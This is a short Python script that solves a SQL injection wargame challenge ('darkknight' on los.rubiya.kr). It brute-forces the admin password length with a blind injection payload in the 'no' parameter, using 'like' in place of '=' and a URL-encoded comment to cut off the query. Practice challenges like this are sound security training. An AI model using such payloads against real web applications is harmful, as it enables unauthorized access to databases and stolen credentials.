import requests
url = 'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php'
cookie = {'PHPSESSID' : 개인쿠키값}

for i in range(1, 30):
    req_url = url + f'?no=1 or id like "admin" and length(pw) like {i}%23'
    res = requests.get(req_url, cookies=cookie)
    if "<h2>Hello admin</h2>" in res.text:
        print(f"{i} -> O")
        break
    else:
        print(f"{i} ---> X")